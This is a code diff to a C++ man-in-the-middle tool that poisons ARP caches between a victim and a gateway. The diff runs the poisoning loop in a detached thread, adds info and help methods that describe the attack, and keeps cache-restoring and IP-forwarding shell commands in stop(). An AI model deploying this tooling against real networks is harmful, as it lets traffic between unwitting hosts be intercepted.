@@ -15,10 +15,9 @@ Mitm::Mitm(Core &core, const std::string &victimIp, const std::string &gatewayIp
     std::cout << "Start MITM : [" << _gateway.ip() << "] <---> [" << _victim.ip() << "]" << std::endl;
 }
 
-void Mitm::start(void)
+void Mitm::poison(void)
 {
     // Start poisoning arp tables
-    std::cout << "Starting arp poisoning" << std::endl;
     _run = true;
     while (_run)
     {
@@ -31,6 +30,13 @@ void Mitm::start(void)
     }
 }
 
+void Mitm::start(void)
+{
+    std::thread     t(&Mitm::poison, this);
+
+    t.detach();
+}
+
 void Mitm::stop(void)
 {
     std::cout << "Stopping MITM.." << std::endl;
@@ -40,7 +46,6 @@ void Mitm::stop(void)
     system("echo 0 > /proc/sys/net/ipv4/ip_forward");
 
     // Restore arp cache
-    std::cout << "Restore arp cache" << std::endl;
     for (int i = 0; i < 2; i++)
     {
         // Tell gateway thats _victim.ip() is _victim.mac()
@@ -48,4 +53,21 @@ void Mitm::stop(void)
         // Tell victim thats _gateway.ip() is _gateway.mac()
         _core.arpReply(_gateway.ip(), _gateway.mac(), _victim.ip(), _victim.mac());
     }
+}
+
+std::string Mitm::info(void)
+{
+    std::stringstream   ss;
+
+    ss << "Victim ip : " << _victim.ip() << " - Gateway ip : " << _gateway.ip();
+    return ss.str();
+}
+
+std::string Mitm::help(void)
+{
+    std::string     rep;
+
+    rep += "Start a man in the middle attack by arp poisoning.\n";
+    rep += "\tOptions : <VictimIp> <GatewayIp>\n";
+    return rep;
 }
